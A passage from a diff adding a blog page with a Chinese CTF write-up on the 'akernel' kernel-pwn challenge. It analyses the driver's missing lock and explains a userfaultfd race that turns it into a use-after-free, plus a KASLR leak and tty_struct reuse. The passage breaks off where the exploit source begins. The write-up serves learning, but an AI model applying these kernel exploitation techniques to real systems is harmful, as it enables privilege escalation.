@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="0rb1t">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/09/11/从一道kernelpwn题了解userfaultfd机制的利用/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="题目名称：akernel附件：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1qJKgj6SZBnkcWuo3WrosBw?pwd&#x3D;GAME  分析我们先对rootfs.cpio进行解包 123mkdir initramfscd initramfscpio -idm &lt; ..&#x2F;rootfs.cpio  查看init文件 12345678910111213141516171819202122">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道kernelpwn题了解userfaultfd机制的利用">
+<meta property="og:url" content="http://example.com/2024/09/11/%E4%BB%8E%E4%B8%80%E9%81%93kernelpwn%E9%A2%98%E4%BA%86%E8%A7%A3userfaultfd%E6%9C%BA%E5%88%B6%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="题目名称：akernel附件：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1qJKgj6SZBnkcWuo3WrosBw?pwd&#x3D;GAME  分析我们先对rootfs.cpio进行解包 123mkdir initramfscd initramfscpio -idm &lt; ..&#x2F;rootfs.cpio  查看init文件 12345678910111213141516171819202122">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/1.png">
+<meta property="og:image" content="http://example.com/2024/08/16/D-Link%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2022-26258%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/.png">
+<meta property="og:image" content="http://example.com/2.png">
+<meta property="og:image" content="http://example.com/3.png">
+<meta property="og:image" content="http://example.com/5.png">
+<meta property="og:image" content="http://example.com/6.png">
+<meta property="og:image" content="http://example.com/7.png">
+<meta property="og:image" content="http://example.com/8.png">
+<meta property="article:published_time" content="2024-09-11T11:33:05.000Z">
+<meta property="article:modified_time" content="2024-09-15T10:45:53.461Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="KernelPwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            从一道kernelpwn题了解userfaultfd机制的利用 -
+        
+        0rb1t&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to my blog.","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/8/4 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        0rb1t&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                0rb1t&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">从一道kernelpwn题了解userfaultfd机制的利用</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/redefine-avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">0rb1t</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-09-11 19:33:05</span>
+        <span class="mobile">2024-09-11 19:33:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-09-15 18:45:53</span>
+            <span class="mobile">2024-09-15 18:45:53</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/KernelPwn/">KernelPwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="题目名称：akernel"><a href="#题目名称：akernel" class="headerlink" title="题目名称：akernel"></a>题目名称：akernel</h3><p>附件：<a class="link"   target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qJKgj6SZBnkcWuo3WrosBw?pwd=GAME" >https://pan.baidu.com/s/1qJKgj6SZBnkcWuo3WrosBw?pwd=GAME <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>我们先对rootfs.cpio进行解包</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">cpio -idm &lt; ../rootfs.cpio</span><br></pre></td></tr></table></figure></div>
+
+<p>查看init文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">[ -d /dev ] || <span class="built_in">mkdir</span> -m 0755 /dev</span><br><span class="line">[ -d /sys ] || <span class="built_in">mkdir</span> /sys</span><br><span class="line">[ -d /proc ] || <span class="built_in">mkdir</span> /proc</span><br><span class="line">[ -d /tmp ] || <span class="built_in">mkdir</span> /tmp</span><br><span class="line">[ -d /etc ] || <span class="built_in">mkdir</span> /etc</span><br><span class="line"></span><br><span class="line">mount -t proc -o nodev,noexec,nosuid proc /proc</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf /proc/mounts /etc/mtab</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/vm/unprivileged_userfaultfd//开启非特权userfaultfd</span><br><span class="line"></span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">chown</span> root:user /dev/console</span><br><span class="line"><span class="built_in">chown</span> root:user /dev/ptmx</span><br><span class="line"><span class="built_in">chown</span> root:user /dev/tty</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /dev/sda &gt; /flag</span><br><span class="line"><span class="built_in">chmod</span> 600 flag</span><br><span class="line"></span><br><span class="line">insmod /akernel.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/akernel </span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure></div>
+
+<p>通过insmod命令可以知道驱动文件是akernel.ko</p>
+<p>运行.&#x2F;start.sh启动qemu</p>
+<p>uname查看系统版本可以看到是5.11，默认userfaultfd在5.11及以后需要特权用户才能使用，不过先前init文件中使用命令开启了非特权userfaultfd，所以我们仍然可以利用这个机制。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/1.png"
+                      alt="image-20240911194529435"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/08/16/D-Link%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2022-26258%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/.png"
+                     
+                ></p>
+<p>ida分析akernel.ko。</p>
+<p>可以看到akernel_ioctl函数，指令0xff04会将用户设置的任意地址的值copy到ptr上。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2.png"
+                      alt="image-20240911194721892"
+                ></p>
+<p>akernel_read函数可以将ptr上的数据copy给用户。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/3.png"
+                      alt="image-20240911194932789"
+                ></p>
+<p>结合两者我们可以实现任意地址读。</p>
+<p>因为启动了kaslr，所以我们需要泄露内核基地址。</p>
+<p>泄露方法也很简单，利用任意地址读读取固定地址cpu_entry_area，该地址上存放着存放的内核基地址，并且cpu_entry_area不受kaslr影响，始终固定。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/5.png"
+                      alt="image-20240915171417502"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/6.png"
+                      alt="image-20240915171637089"
+                ></p>
+<p>接下来我们继续寻找其他漏洞。</p>
+<p>可以看到akernel_write函数没有给ptr加锁而是直接将用户数据copy到ptr上。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/7.png"
+                      alt="image-20240915172120399"
+                ></p>
+<p>ioctl指令0xff01将ptr进行清空和释放。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/8.png"
+                      alt="image-20240915172230373"
+                ></p>
+<p>由于没有对ptr加锁，所以我们可以先使用kernel_write调用copy_from_user触发userfaultfd卡住调用handler函数，然后handler函数发送信号1并等待信号2。UAF函数接收到信号1调用ioctl_0xff01释放堆，并调用系统的一些api申请同样大小的堆块重新把刚释放的堆块申请回来,接着发送信号2。handler函数接收信号2会继续先前的copy_from_user，而这个时候就会将数据copy到原堆块，但该堆块已经被释放并被其他函数申请走了，此时就会导致uaf。</p>
+<p>这里heap申请的是0x300的堆，实际会得到0x400的堆块，可以使用pipe_buffer或者tty_struct进行uaf的利用，这里我们使用tty进行利用。</p>
+<h5 id="Exp："><a href="#Exp：" class="headerlink" title="Exp："></a>Exp：</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _QWORD unsigned long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _WORD unsigned short</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ULL unsigned long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOSE printf(<span class="string">&quot;\033[0m\n&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED printf(<span 